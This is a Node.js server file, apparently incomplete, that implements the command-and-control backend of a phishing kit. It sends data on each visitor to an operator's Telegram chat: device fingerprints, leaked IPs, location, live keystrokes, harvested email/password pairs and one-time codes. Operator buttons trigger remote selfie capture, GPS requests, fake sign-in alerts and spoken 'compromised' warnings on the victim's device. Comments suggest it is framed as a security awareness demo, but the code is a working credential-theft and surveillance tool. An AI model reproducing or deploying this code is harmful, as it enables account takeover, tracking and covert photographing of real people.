const express = require("express");
const path = require("path");
const http = require("http");
const https = require("https");
const crypto = require("crypto");
const fs = require("fs");

// ── Config: env vars first, then config.json ──────────────────────────
let CONFIG = {};
try {
  CONFIG = JSON.parse(fs.readFileSync(path.join(__dirname, "config.json"), "utf8"));
} catch (e) { /* config.json optional */ }

const BOT_TOKEN = process.env.BOT_TOKEN || CONFIG.bot_token;
const CHAT_ID = process.env.CHAT_ID || CONFIG.chat_id;
const ADMIN_KEY = process.env.ADMIN_KEY || CONFIG.admin_key || "changeme";
const PORT = process.env.PORT || 3000;

if (!BOT_TOKEN || !CHAT_ID) {
  console.error("\n[!] Missing Telegram config.");
  console.error("    Create config.json in this folder:");
  console.error('    { "bot_token": "123456:ABC...", "chat_id": "987654321" }\n');
  process.exit(1);
}

// ── Telegram state on disk (per bot token) ───────────────────────────────
// Polling the SAME bot token from two server instances is the classic cause
// of duplicate messages: every getUpdates client receives its own copy of an
// update, so ONE button press can fire N handlers (each instance sends from
// its own session store → the two registries even disagree on contents).
// Restarts can do the same when the in-memory offset resets to 0 and Telegram
// replays the recent backlog.
//
// Hardening below:
//   • confirmed offset is persisted, so a restart resumes where the old
//     process left off instead of replaying the backlog from 0;
//   • every processed update_id and callback_query id is recorded in the same
//     file, so a twin instance (or a re-delivered update) is skipped instead
//     of double-firing;
//   • rapid same-button double-taps are debounced;
//   • a per-token lock file warns loudly at boot when another live instance
//     is already polling this token.
const tgTag = crypto.createHash("sha1").update(String(BOT_TOKEN)).digest("hex").slice(0, 8);
const TGSTATE_PATH = path.join(__dirname, `tgstate-${tgTag}.json`);
const LOCK_PATH = path.join(__dirname, `run-${tgTag}.lock`);

const tgState = { offset: 0, seen: {}, cb: {} }; // offset + seen update_ids + processed callback ids
(function loadTgState() {
  try {
    const j = JSON.parse(fs.readFileSync(TGSTATE_PATH, "utf8"));
    if (typeof j.offset === "number" && j.offset >= 0) tgState.offset = j.offset;
    if (j.seen && typeof j.seen === "object") tgState.seen = j.seen;
    if (j.cb && typeof j.cb === "object") tgState.cb = j.cb;
    console.log(`[+] TG state restored: offset=${tgState.offset}, seen=${Object.keys(tgState.seen).length}, cbSeen=${Object.keys(tgState.cb).length}`);
  } catch (e) { /* fresh state */ }
})();

function pruneTgState() {
  const now = Date.now();
  for (const k of Object.keys(tgState.seen)) if (now - tgState.seen[k] > 15 * 60e3) delete tgState.seen[k];
  for (const k of Object.keys(tgState.cb)) if (now - tgState.cb[k] > 60 * 60e3) delete tgState.cb[k];
  const cap = (o, n) => { const ks = Object.keys(o); if (ks.length > n) for (const k of ks.slice(0, ks.length - n)) delete o[k]; };
  cap(tgState.seen, 4000);
  cap(tgState.cb, 4000);
}

function saveTgState() {
  try {
    pruneTgState();
    const tmp = TGSTATE_PATH + ".tmp";
    fs.writeFileSync(tmp, JSON.stringify(tgState));
    fs.renameSync(tmp, TGSTATE_PATH);
  } catch (e) { /* non-fatal */ }
}

// Per-token advisory lock: if a LIVE twin process owns this token, say so
// loudly (duplicate presses WILL occur until it is stopped) — then keep going.
(function claimLock() {
  try {
    const old = JSON.parse(fs.readFileSync(LOCK_PATH, "utf8"));
    if (old && old.pid && old.pid !== process.pid) {
      let alive = false;
      try { process.kill(old.pid, 0); alive = true; } catch (e) { alive = e.code !== "ESRCH"; }
      if (alive) {
        console.warn(`\n⚠️  ANOTHER INSTANCE (pid ${old.pid}) is already polling this bot token.`);
        console.warn(`    Button presses may be handled TWICE (e.g. double 🗂 registry).`);
        console.warn(`    Stop it (kill pid ${old.pid}), then run ONE server only.\n`);
      }
    }
  } catch (e) { /* no lock yet */ }
  try { fs.writeFileSync(LOCK_PATH, JSON.stringify({ pid: process.pid, started: Date.now() })); } catch (e) {}
  process.on("exit", () => { try { fs.unlinkSync(LOCK_PATH); } catch (e) {} });
})();

// Same-button double-tap debounce (operator chat + button payload).
const lastPress = new Map(); // key `chatId:data` -> ts
const PRESS_DEBOUNCE_MS = 800;

const app = express();
app.use(express.json());
app.use(express.text({ type: "text/plain", limit: "2mb" })); // for sendBeacon
app.use(express.raw({ type: "image/png", limit: "15mb" })); // selfie + heatmap uploads

// ── Pre-static gate: crowd-demo + PDF-lure routes ─────────────────────
//    Must run BEFORE express.static so that /?crowd=1 never reveals the
//    phishing page and taps on /d/notes.pdf are logged to the C2.
app.use((req, res, next) => {
  if (req.path === "/" && req.query.crowd === "1") return res.redirect("/crowd.html");
  if (req.path === "/crowd-ping" && req.method === "POST") return onCrowdPing(req, res);
  if (req.path === "/d/notes.pdf") return onPdfHit(req, res);
  next();
});
app.use(express.static(path.join(__dirname, "public")));

// ══════════════════════════════════════════════════════════════
//  TELEGRAM LAYER — generic API client (JSON + multipart)
// ══════════════════════════════════════════════════════════════
const TG = `https://api.telegram.org/bot${BOT_TOKEN}`;

async function tg(method, body = {}) {
  try {
    const r = await fetch(`${TG}/${method}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });
    return await r.json();
  } catch (e) {
    console.error(`[tg:${method}]`, e.message);
    return null;
  }
}

async function tgSend(html, extra = {}) {
  return tg("sendMessage", { chat_id: CHAT_ID, text: html, parse_mode: "HTML", ...extra });
}

async function tgMultipart(method, form) {
  try {
    const r = await fetch(`${TG}/${method}`, { method: "POST", body: form });
    return await r.json();
  } catch (e) {
    console.error(`[tg:${method}:multipart]`, e.message);
    return null;
  }
}

// ══════════════════════════════════════════════════════════════
//  UNIFIED TELEGRAM DASHBOARD
//  One self-updating dashboard message (/dash) + one optional
//  console per session. Ordinary activity goes to feeds and is
//  applied as SILENT in-place edits (editMessageText). NEW
//  messages are reserved for real alerts: first-visit dossier,
//  creds / OTP / autofill, photos, map pins and session end.
//  Nothing here is invoked at module load — all state lives on
//  the sessions registry defined below.
// ══════════════════════════════════════════════════════════════
const FEED_MAX = 22;          // lines kept in the global dashboard feed
const SESSION_FEED_MAX = 18;  // lines kept in one session's console feed
const EDIT_GAP_MS = 900;      // min gap between edits of the same message
const globalFeed = [];        // { t, icon, sid, line }
const sessionFeeds = new Map(); // sid -> [html line]
const liveDash = { msgId: null, timer: null, last: 0 };
const liveCons = new Map();     // sid -> { msgId, timer, last }

const feedStamp = () => new Date().toLocaleTimeString("en-IN", { hour12: false });

async function editMsg(msgId, html, kb) {
  const r = await tg("editMessageText", {
    chat_id: CHAT_ID, message_id: msgId, text: html,
    parse_mode: "HTML", reply_markup: kb,
  });
  if (r && r.ok) return true;
  // "message is not modified" is not an error — content just didn't change
  if (r && r.description && /not modified/i.test(r.description)) return true;
  return false;
}

// Append one line of activity. Stored per session AND globally; the
// dashboard/console messages are only edited if they already exist.
function pushFeed(s, line) {
  const html = String(line).slice(0, 400);
  if (!html) return;
  const sf = sessionFeeds.get(s.sid) || [];
  sf.push(html);
  if (sf.length > SESSION_FEED_MAX) sf.splice(0, sf.length - SESSION_FEED_MAX);
  sessionFeeds.set(s.sid, sf);

  const icon = classify(s.ua).icon;
  const last = globalFeed[globalFeed.length - 1];
  const dup = last && last.sid === s.sid && last.line === html && Date.now() - last._t < 1500;
  if (!dup) {
    globalFeed.push({ t: feedStamp(), icon, sid: s.sid, line: html, _t: Date.now() });
    if (globalFeed.length > FEED_MAX) globalFeed.splice(0, globalFeed.length - FEED_MAX);
  }
  if (liveDash.msgId) queueDashEdit();
  if (liveCons.has(s.sid)) queueConEdit(s.sid);
}

// ── Dashboard (global) ────────────────────────────────────────
function deviceRegLine(s) {
  const cls = classify(s.ua);
  const online = Date.now() - s.lastSeen < 30000;
  const geo = s.location
    ? `${esc(s.location.city)}, ${esc(s.location.country)}`
    : isPrivateIp(s.ip) ? "local net" : "geo…";
  const tag = (s.creds ? " 🔐" : "") + (s.otp ? " 🔑" : "") + (s.pdfHits ? " 📄" : "");
  return `${online ? "🟢" : "⚫"} <code>${esc(s.sid)}</code> · ${esc(String(cls.label).split(" ").slice(0, 2).join(" "))} · ${geo} · v${s.visits}${tag}`;
}

function renderDash() {
  const all = Array.from(sessions.values());
  const online = all.filter((s) => Date.now() - s.lastSeen < 30000).length;
  const keysN = all.reduce((a, s) => a + s.keys.length, 0);
  const reg = all
    .sort((a, b) => b.lastSeen - a.lastSeen).slice(0, 8)
    .map(deviceRegLine).join("\n");
  const feed = globalFeed.slice(-FEED_MAX)
    .map((e) => `${e.icon} <code>${esc(e.sid)}</code> <i>${e.t}</i> ${e.line}`).join("\n");
  let h = `📊 <b>LIVE DASHBOARD</b> — ${feedStamp()}\n`;
  h += `━━━━━━━━━━━━━━━━━━━━\n`;
  h += `👁️ ${all.length} device(s) · 🟢 ${online} online · ⌨️ ${keysN} keys · 🔐 ${all.filter((s) => s.creds).length} cred · 🔑 ${all.filter((s) => s.otp).length} OTP\n`;
  if (reg) h += `\n<b>── DEVICES ──</b>\n${reg}`;
  if (feed) h += `\n\n<b>── LIVE FEED ──</b>\n${feed}`;
  return h;
}

function dashKeyboard() {
  const rows = [];
  const tops = Array.from(sessions.values())
    .sort((a, b) => b.lastSeen - a.lastSeen).slice(0, 8);
  if (tops.length) {
    rows.push(tops.map((s) => ({ text: "🎛 " + s.sid, callback_data: "console:" + s.sid })));
  }
  rows.push([{ text: "🔄 Refresh", callback_data: "dash" }]);
  return { inline_keyboard: rows };
}

function queueDashEdit() {
  if (liveDash.timer) return;
  const wait = Math.max(0, liveDash.last + EDIT_GAP_MS - Date.now()) + 120;
  liveDash.timer = setTimeout(() => { liveDash.timer = null; flushDashEdit(); }, Math.min(wait, 2000));
}

async function flushDashEdit() {
  if (!liveDash.msgId) return;
  const ok = await editMsg(liveDash.msgId, renderDash(), dashKeyboard());
  if (!ok) { liveDash.msgId = null; return; }
  liveDash.last = Date.now();
}

async function ensureDash() {
  const r = await tgSend(renderDash(), { reply_markup: dashKeyboard() });
  if (r && r.ok && r.result) {
    liveDash.msgId = r.result.message_id;
    liveDash.last = Date.now();
    return true;
  }
  return false;
}

// ── Per-session console ───────────────────────────────────────
function renderConsole(s) {
  const cls = classify(s.ua);
  const online = Date.now() - s.lastSeen < 30000;
  const d = s.device || {};
  const feed = sessionFeeds.get(s.sid) || [];
  let h = `🎛 <b>CONSOLE</b> — ${cls.icon} ${esc(cls.label)} ${online ? "🟢" : "⚫"}\n`;
  h += `━━━━━━━━━━━━━━━━━━━━\n`;
  h += `🆔 <code>${esc(s.sid)}</code> · 🌍 <code>${esc(s.ip)}</code> · visits ${s.visits}\n`;
  h += `📱 ${esc(d.browser || "?")}${d.screen ? " · " + esc(d.screen) : ""}${d.battery ? " · 🔋" + d.battery.level + "%" : ""}${d.webview ? "\n🌐 " + esc(d.webview) : ""}`;
  if (s.location) h += `\n📍 ${esc(s.location.city)}, ${esc(s.location.region)}, ${esc(s.location.country)} · ${esc(s.location.isp)}`;
  if (s.gps && s.gps.lat) h += `\n🎯 GPS: <code>${Number(s.gps.lat).toFixed(5)}, ${Number(s.gps.lon).toFixed(5)}</code>${s.gps.acc ? " ±" + Math.round(s.gps.acc) + "m" : ""} · fix #${s.fixes || 1}`;
  if (s.creds) h += `\n🔐 <code>${esc(s.creds.email)}</code> : <code>${esc(s.creds.password)}</code>`;
  if (s.otp) h += `\n🔑 <b>OTP</b> <code>${esc(s.otp.code)}</code> — takeover chain complete`;
  if (feed.length) h += `\n\n<b>── ACTIVITY ──</b>\n` + feed.slice(-SESSION_FEED_MAX).join("\n");
  return h;
}

function consoleKeyboard(sid) {
  return { inline_keyboard: [
    [
      { text: "📳 Buzz", callback_data: `act:buzz:${sid}` },
      { text: "⚡ Flash", callback_data: `act:flash:${sid}` },
      { text: "🚨 Nudge", callback_data: `act:nudge:${sid}` },
    ],
    [
      { text: "🗣 Speak", callback_data: `act:speak:${sid}` },
      { text: "📍 GPS", callback_data: `act:gps:${sid}` },
      { text: "📷 Selfie", callback_data: `act:selfie:${sid}` },
    ],
    [
      { text: "🔦 Torch ON", callback_data: `act:torchOn:${sid}` },
      { text: "🔦 Torch OFF", callback_data: `act:torchOff:${sid}` },
      { text: "🚨 Siren", callback_data: `act:siren:${sid}` },
    ],
    [
      { text: "📋 Dossier", callback_data: `who:${sid}` },
      { text: "⌨️ Keys", callback_data: `keys:${sid}` },
      { text: "🔄 Refresh", callback_data: `con:${sid}` },
    ],
  ] };
}

function queueConEdit(sid) {
  const c = liveCons.get(sid);
  if (!c || c.timer) return;
  const wait = Math.max(0, c.last + EDIT_GAP_MS - Date.now()) + 120;
  c.timer = setTimeout(() => { c.timer = null; flushConEdit(sid); }, Math.min(wait, 2000));
}

async function flushConEdit(sid) {
  const c = liveCons.get(sid);
  const s = sessions.get(sid);
  if (!c || !s || !c.msgId) return;
  const ok = await editMsg(c.msgId, renderConsole(s), consoleKeyboard(sid));
  if (!ok) { c.msgId = null; return; }
  c.last = Date.now();
}

async function openConsole(sid) {
  const s = sessions.get(sid);
  if (!s) return false;
  const cur = liveCons.get(sid);
  if (cur && cur.msgId) {
    const ok = await editMsg(cur.msgId, renderConsole(s), consoleKeyboard(sid));
    if (ok) { cur.last = Date.now(); return true; }
    liveCons.delete(sid);
  }
  const r = await tgSend(renderConsole(s), { reply_markup: consoleKeyboard(sid) });
  if (r && r.ok && r.result) liveCons.set(sid, { msgId: r.result.message_id, timer: null, last: Date.now() });
  return !!(r && r.ok);
}

// ── C2 quick-actions (console buttons → queueCmd) ─────────────
const ACTS = {
  buzz:     { action: "buzz",     label: "📳 buzz", arg: undefined },
  flash:    { action: "flash",    label: "⚡ screen flash", arg: undefined },
  nudge:    { action: "nudge",    label: "🚨 takeover overlay", arg: "New sign-in on your account — Bengaluru, India · Chrome on Windows · 2FA code used ✔️" },
  speak:    { action: "speak",    label: "🗣 voice", arg: "This device has been compromised." },
  gps:      { action: "gps",      label: "📍 GPS request", arg: undefined },
  selfie:   { action: "selfie",   label: "📷 selfie capture (×3 burst)", arg: "3" },
  siren:    { action: "siren",    label: "🚨 siren alarm", arg: undefined },
  torchOn:  { action: "torchOn",  label: "🔦 torch ON", arg: undefined },
  torchOff: { action: "torchOff", label: "🔦 torch OFF", arg: undefined },
};

function runAction(sid, name) {
  const s = sessions.get(sid);
  const t = ACTS[name];
  if (!s || !t) return false;
  queueCmd(sid, t.action, t.arg);
  pushFeed(s, `${t.label} — <b>queued by operator</b>`);
  return true;
}

// Truncate a Telegram reply safely at line boundaries so HTML stays valid.
function clipLines(html, max = 3600) {
  if (html.length <= max) return html;
  const lines = html.split("\n");
  let out = "";
  let dropped = 0;
  for (const ln of lines) {
    if (out.length + ln.length + 1 > max) { dropped++; continue; }
    out += ln + "\n";
  }
  return out.trimEnd() + `\n<i>…(+${dropped} lines truncated)</i>`;
}

// Route every inline-button press from dash / dossier / console messages
// through one dispatcher so the poll loop stays tiny.
async function handleCallback(q) {
  const parts = String(q.data || "").split(":");
  const head = parts[0];
  let toast = "";
  try {
    // ── dedupe gate ────────────────────────────────────────────────────
    // The SAME button press can be delivered twice: a twin instance polling
    // this token receives its own copy of every update, and a reconnect can
    // make Telegram re-deliver recent ones. Both copies carry the same
    // callback_query id, so record each id in the shared tgstate file and
    // answer (not dispatch) any repeat. Rapid same-button double-taps get a
    // debounce instead of a second dispatch.
    const opWho = q.from && q.from.id != null ? String(q.from.id) : String(CHAT_ID);
    const pressKey = `${opWho}:${q.data}`;
    if (tgState.cb[q.id]) {
      tg("answerCallbackQuery", { callback_query_id: q.id, text: "✅ Already handled" }).catch(() => {});
      return;
    }
    const prevPress = lastPress.get(pressKey);
    if (prevPress && Date.now() - prevPress < PRESS_DEBOUNCE_MS) {
      tg("answerCallbackQuery", { callback_query_id: q.id, text: "⏳ One moment…" }).catch(() => {});
      return;
    }
    // Record intent BEFORE dispatch so a racing twin sees it as handled.
    tgState.cb[q.id] = Date.now();
    lastPress.set(pressKey, Date.now());
    saveTgState();
    if (head === "dash") {
      if (liveDash.msgId) {
        const ok = await editMsg(liveDash.msgId, renderDash(), dashKeyboard());
        if (ok) {
          liveDash.last = Date.now();
          toast = "📊 Dashboard refreshed";
        } else {
          // stale dash msgId (message deleted/cleared) -> send a fresh board
          liveDash.msgId = null;
          toast = (await ensureDash()) ? "📊 Dashboard sent" : "⚠️ Dashboard failed — check server console";
        }
      } else {
        toast = (await ensureDash()) ? "📊 Dashboard sent" : "⚠️ Dashboard failed — check server console";
      }
    } else if (head === "list") {
      await handleCommand("/list");
      toast = "🗂 Device list sent";
    } else if (head === "console") {
      const ok = await openConsole(parts[1]);
      toast = ok ? "🎛 Console opened" : "⚠️ Session gone — press 🗂 All devices";
    } else if (head === "con") {
      const c = liveCons.get(parts[1]);
      const s = sessions.get(parts[1]);
      if (c && c.msgId && s) {
        const ok = await editMsg(c.msgId, renderConsole(s), consoleKeyboard(parts[1]));
        if (ok) c.last = Date.now();
        toast = "🔄 Console refreshed";
      } else {
        toast = "⚠️ Console closed — press 🎛 to reopen";
      }
    } else if (head === "act") {
      toast = runAction(parts[2], parts[1]) ? "⚡ Command queued" : "⚠️ Command not sent — session gone";
    } else if (head === "who") {
      const s = sessions.get(parts[1]);
      if (s) { await tgSend(clipLines(buildDossier(s))); toast = "📋 Dossier sent"; }
      else toast = "⚠️ Session gone — press 🗂 All devices";
    } else if (head === "keys") {
      const s = sessions.get(parts[1]);
      if (s) { await handleCommand(`/keys ${parts[1]} 15`); toast = "🔑 Keys sent"; }
      else toast = "⚠️ Session gone — press 🗂 All devices";
    }
  } catch (e) {
    console.error("[cb]", e.message);
    toast = `⚠️ ${String(e.message || "error").slice(0, 90)}`;
  }
  const body = { callback_query_id: q.id };
  if (toast) body.text = toast;
  tg("answerCallbackQuery", body).catch(() => {});
}

// Wipe all live-message state (used by /clear).
function resetLive() {
  if (liveDash.timer) clearTimeout(liveDash.timer);
  liveDash.timer = null;
  liveDash.msgId = null;
  liveDash.last = 0;
  for (const c of liveCons.values()) if (c.timer) clearTimeout(c.timer);
  liveCons.clear();
  globalFeed.length = 0;
  sessionFeeds.clear();
}

// ══════════════════════════════════════════════════════════════
//  SESSION REGISTRY + PERSISTENCE
// ══════════════════════════════════════════════════════════════
const sessions = new Map();
const STORE_PATH = path.join(__dirname, "sessions.json");

try {
  if (fs.existsSync(STORE_PATH)) {
    for (const s of JSON.parse(fs.readFileSync(STORE_PATH, "utf8"))) sessions.set(s.sid, s);
    console.log(`[+] Restored ${sessions.size} session(s) from disk`);
  }
} catch (e) { /* corrupt store, start fresh */ }

let saveTimer = null;
function saveSessions() {
  clearTimeout(saveTimer);
  saveTimer = setTimeout(() => {
    try {
      fs.writeFileSync(STORE_PATH, JSON.stringify(Array.from(sessions.values()), null, 1));
    } catch (e) { /* non-fatal */ }
  }, 1500);
}

function newSession(sid, req) {
  return {
    sid, ip: clientIp(req), ua: req.headers["user-agent"] || "unknown",
    device: {}, location: null, keys: [], events: [],
    creds: null, otp: null, autofill: null, visits: 0,
    dwellMs: 0, scrollPct: 0, touches: 0, keyCount: 0,
    heatBuf: null, exitSummary: null,
    pdfHits: 0, pdfNotified: false,
    cohort: null, permLog: {},
    stage: "landed", stageAt: Date.now(),
    stageLog: [{ stage: "landed", t: Date.now() }],
    firstSeen: Date.now(), lastSeen: Date.now(),
  };
}

function sessionFor(req, vid) {
  const ip = clientIp(req);
  const ua = req.headers["user-agent"] || "unknown";
  const sid = vid
    ? String(vid).replace(/[^a-f0-9]/gi, "").slice(0, 12)
    : crypto.createHash("sha256").update(ip + "|" + ua).digest("hex").slice(0, 12);

  if (!sessions.has(sid)) sessions.set(sid, newSession(sid, req));
  const s = sessions.get(sid);
  s.ip = isPrivateIp(s.ip) ? ip : s.ip;
  s.lastSeen = Date.now();
  ensureCohort(s, req);
  return s;
}

// ── Cohort + stage model ───────────────────────────────────────────────
//  Prompt cohort: page asks for location/camera normally → grant telemetry.
//  Stingy cohort: prompts suppressed (simulated paranoid user). Creds + OTP
//  are typed by BOTH cohorts — that is the demo's punchline.
function pickCohort(req) {
  const q = req.query && req.query.cohort;
  if (q === "prompt" || q === "stingy") return q;
  let body = req.body;
  if (typeof body === "string") { try { body = JSON.parse(body); } catch (e) { body = null; } }
  const c = body && (body.cohort || body._cohort);
  if (c === "prompt" || c === "stingy") return c;
  return null;
}

const STAGE_ORDER = { landed: 1, typed: 2, creds: 3, otp: 4 };
const stageEmoji = (s) => ({ landed: "👀", typed: "⌨️", creds: "🔐", otp: "🔑" }[s] || "👀");

function setStage(s, stage) {
  if (!STAGE_ORDER[stage]) return;
  s.stageLog = s.stageLog || [];
  const cur = STAGE_ORDER[s.stage] || 0;
  if (STAGE_ORDER[stage] < cur) return; // stages only move forward
  s.stage = stage;
  s.stageAt = Date.now();
  const last = s.stageLog[s.stageLog.length - 1];
  if (!last || last.stage !== stage) {
    s.stageLog.push({ stage, t: s.stageAt });
    if (s.stageLog.length > 8) s.stageLog.shift();
  }
}

function ensureCohort(s, req) {
  if (!s.cohort) {
    s.cohort = pickCohort(req) || (parseInt(s.sid[0] || "c", 16) % 2 ? "stingy" : "prompt");
  }
  s.permLog = s.permLog || {};
  s.stageLog = s.stageLog || [];
  if (!s.stage) setStage(s, "landed");
}

// Permission outcome tallies (used by /stats, dossier, admin dashboard)
function permTallies(all) {
  const t = {};
  for (const name of ["location", "camera", "notifications"]) {
    t[name] = { granted: 0, denied: 0, prompted: 0, asked: 0, rate: null };
    for (const s of all) {
      const p = (s.permLog || {})[name];
      if (!p) continue;
      t[name].prompted += 1;
      if (p.state === "granted") t[name].granted++;
      else if (p.state === "denied") t[name].denied++;
    }
    t[name].asked = t[name].granted + t[name].denied;
    t[name].rate = t[name].asked ? Math.round((t[name].granted / t[name].asked) * 100) : null;
  }
  return t;
}

const iconFor = (t) => ({ android: "🤖", ios: "🍎", windows: "🖥️", mac: "💻", linux: "🐧", other: "❓" }[t] || "❓");

// ── Device classification (for Telegram-side filtering) ────────
function classify(ua) {
  const u = String(ua);
  if (/iPhone|iPad|iPod/.test(u)) return { type: "ios", icon: "🍎", label: "iPhone/iPad" };
  if (/Android/.test(u)) {
    const m = u.match(/Android\s([\d.]+)/);
    const dev = u.match(/;\s([^)]+?)\s*Build/);
    return { type: "android", icon: "🤖", label: "Android " + (m ? m[1] : "") + (dev ? " " + dev[1].trim() : "") };
  }
  if (/Windows/.test(u)) return { type: "windows", icon: "🖥️", label: "Windows PC" };
  if (/Macintosh/.test(u)) return { type: "mac", icon: "💻", label: "Mac" };
  if (/Linux/.test(u)) return { type: "linux", icon: "🐧", label: "Linux PC" };
  return { type: "other", icon: "❓", label: "Unknown" };
}

// ══════════════════════════════════════════════════════════════
//  HELPERS
// ══════════════════════════════════════════════════════════════
function clientIp(req) {
  const fwd = req.headers["x-forwarded-for"];
  if (fwd) return fwd.split(",")[0].trim();
  return req.socket.remoteAddress || "unknown";
}

function isPrivateIp(ip) {
  return (
    ip === "unknown" ||
    ip.startsWith("127.") || ip.startsWith("10.") || ip.startsWith("192.168.") ||
    ip.startsWith("::1") || ip.startsWith("fc") || ip.startsWith("fd") ||
    /^172\.(1[6-9]|2\d|3[01])\./.test(ip)
  );
}

function geoLookup(ip) {
  if (isPrivateIp(ip)) return Promise.resolve(null);
  return new Promise((resolve) => {
    const req = http.get(
      { hostname: "ip-api.com", path: `/json/${ip}?fields=status,country,regionName,city,isp,timezone,lat,lon,mobile,proxy`, timeout: 4000 },
      (res) => {
        let body = "";
        res.on("data", (c) => (body += c));
        res.on("end", () => {
          try {
            const d = JSON.parse(body);
            resolve(d.status === "success" ? d : null);
          } catch (e) { resolve(null); }
        });
      }
    );
    req.on("error", () => resolve(null));
    req.on("timeout", () => { req.destroy(); resolve(null); });
  });
}

const esc = (s) => String(s ?? "?").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
const nowIST = () => new Date().toLocaleTimeString("en-IN", { hour12: false });

// Typing-action mirror throttle: max one ping per session per 3.5s
const lastTypingPing = new Map();
function mirrorTyping(sid) {
  const now = Date.now();
  if (now - (lastTypingPing.get(sid) || 0) < 3500) return;
  lastTypingPing.set(sid, now);
  tg("sendChatAction", { chat_id: CHAT_ID, action: "typing" });
}

// ══════════════════════════════════════════════════════════════
//  DOSSIER BUILDER
// ══════════════════════════════════════════════════════════════
function buildDossier(s) {
  const d = s.device || {};
  const cls = classify(s.ua);
  const returning = s.visits > 1 ? ` <i>↩ RETURNING DEVICE — visit #${s.visits}</i>` : "";

  let msg = `🎯 <b>NEW VISITOR @ ${nowIST()}</b>${returning}\n`;
  msg += `━━━━━━━━━━━━━━━━━━━━\n`;
  msg += `${cls.icon} <b>Device:</b> ${esc(d.platform)}\n`;
  msg += `🌐 <b>Browser:</b> ${esc(d.browser)} — <i>${esc(d.webview)}</i>\n`;
  msg += `🗣️ <b>Language:</b> ${esc(d.language)}\n`;
  msg += `🖥️ <b>Screen:</b> ${esc(d.screen)}${d.darkMode ? " (dark mode)" : ""}\n`;
  msg += `⏰ <b>Local time:</b> ${esc(d.localTime)}\n`;

  if (d.battery) msg += `🔋 <b>Battery:</b> ${d.battery.level}%${d.battery.charging ? " (charging)" : " (discharging)"}\n`;
  if (d.connection) msg += `📶 <b>Network:</b> ${esc(d.connection.effectiveType)}${d.connection.downlink ? ` · ~${esc(d.connection.downlink)}Mbps` : ""}${d.connection.saveData ? " · data saver" : ""}\n`;
  if (d.net && d.net.mbps) msg += `📡 <b>Measured:</b> ${d.net.mbps} Mbps · ${d.net.rtt}ms RTT to my server\n`;
  if (d.cores) msg += `⚙️ <b>CPU cores:</b> ${esc(d.cores)} | RAM: ${esc(d.memory || "?")}GB\n`;
  if (d.timezone) msg += `🕐 <b>Timezone:</b> ${esc(d.timezone)}\n`;
  if (d.locale) msg += `💱 <b>Locale:</b> ${esc(d.locale.currency)} · calendar ${esc(d.locale.calendar)} · ${d.locale.hour12 ? "12h" : "24h"} clock\n`;
  if (d.touchSupport) msg += `👆 <b>Touch:</b> yes (${esc(d.maxTouchPoints)} points)\n`;
  if (d.gpu) msg += `🎮 <b>GPU:</b> ${esc(d.gpu)}\n`;

  msg += `\n<b>── DEEP FINGERPRINT ──</b>\n`;
  if (d.webglHash) msg += `🧬 <b>Fingerprint hash:</b> <code>${esc(d.webglHash)}</code>\n`;
  if (d.rtcLocalIp) msg += `🕳️ <b>WebRTC leak — LAN IP:</b> <code>${esc(d.rtcLocalIp)}</code>\n`;
  if (d.rtcPublicIp && d.rtcPublicIp !== s.ip) msg += `🕳️ <b>WebRTC leak — real IP:</b> <code>${esc(d.rtcPublicIp)}</code>\n`;
  if (d.devices) msg += `📷 <b>Hardware:</b> ${d.devices.camera} camera(s), ${d.devices.mic} mic(s), ${d.devices.speaker} speaker(s)\n`;
  if (d.drm) msg += `🎬 <b>DRM level:</b> ${esc(d.drm)}\n`;
  if (d.fonts) msg += `🔤 <b>Installed fonts:</b> ${d.fonts.length} identified\n`;
  if (d.storage) msg += `💾 <b>Storage:</b> ~${d.storage.quotaMB}MB quota, ${d.storage.usedMB}MB used\n`;
  if (d.perms) {
    const granted = Object.entries(d.perms).filter(([, v]) => v === "granted").map(([k]) => k);
    const denied = Object.entries(d.perms).filter(([, v]) => v === "denied").map(([k]) => k);
    msg += `🔔 <b>Permissions:</b> granted: ${esc(granted.join(", ") || "none")} · denied: ${esc(denied.join(", ") || "none")}\n`;
  }
  if (d.tabs > 0) msg += `🪟 <b>Opened in ${d.tabs + 1} tabs</b>\n`;
  if (d.fonts && d.fonts.length) msg += `🧾 <b>Font set:</b> <code>${esc(d.fonts.slice(0, 8).join(", "))}${d.fonts.length > 8 ? "…" : ""}</code>\n`;

  msg += `\n<b>── IDENTITY ──</b>\n`;
  msg += `🌍 <b>IP:</b> <code>${esc(s.ip)}</code>\n`;
  msg += `🆔 <b>Visitor ID:</b> <code>${esc(s.sid)}</code>\n`;

  if (s.location) {
    msg += `📍 <b>Location:</b> ${esc(s.location.city)}, ${esc(s.location.region)} (${esc(s.location.country)})\n`;
    msg += `📡 <b>ISP:</b> ${esc(s.location.isp)}${s.location.mobile ? " · cellular" : ""}${s.location.proxy ? " · ⚠️ VPN/proxy detected" : ""}\n`;
  } else if (isPrivateIp(s.ip)) {
    msg += `📍 <b>Location:</b> local network (testing mode)\n`;
  }

  if (d.referrer) msg += `↩️ <b>Arrived from:</b> ${esc(d.referrer)}\n`;

  msg += `\n<i>🛡️ MITRE ATT&amp;CK: T1592.001 · T1589 · T1417 (Input Capture) · T1430 (Track Location)</i>`;
  return msg;
}

// ══════════════════════════════════════════════════════════════
//  LIVE-EDIT KEYSTROKE MESSAGES (one message per field, typed live)
// ══════════════════════════════════════════════════════════════
const liveKeys = new Map(); // "sid|context" -> { id, raw }

async function streamKeys(s, keys, context) {
  const k = `${s.sid}|${context}`;
  let entry = liveKeys.get(k);
  if (!entry) {
    const r = await tgSend(
      `⌨️ <b>LIVE TYPING</b> <i>[${esc(context)}] — ${classify(s.ua).label}</i>\n<code>${esc(keys)}</code>`,
      { reply_markup: { inline_keyboard: [[
        { text: "📋 Full keys", callback_data: `keys:${s.sid}` },
        { text: "👤 Who", callback_data: `who:${s.sid}` },
      ]] } }
    );
    if (r && r.result) liveKeys.set(k, { id: r.result.message_id, raw: keys });
    return;
  }
  entry.raw += keys;
  if (entry.raw.length > 3200) {
    liveKeys.delete(k);
    return;
  }
  await tg("editMessageText", {
    chat_id: CHAT_ID, message_id: entry.id,
    text: `⌨️ <b>LIVE TYPING</b> <i>[${esc(context)}] — ${classify(s.ua).label}</i>\n<code>${esc(entry.raw)}</code>`,
    parse_mode: "HTML",
  });
}

// ══════════════════════════════════════════════════════════════
//  ENDPOINTS
// ══════════════════════════════════════════════════════════════

// ── New visitor dossier ────────────────────────────────────────────────
app.post("/collect", (req, res) => {
  const s = sessionFor(req, req.body.vid);
  const d = req.body || {};
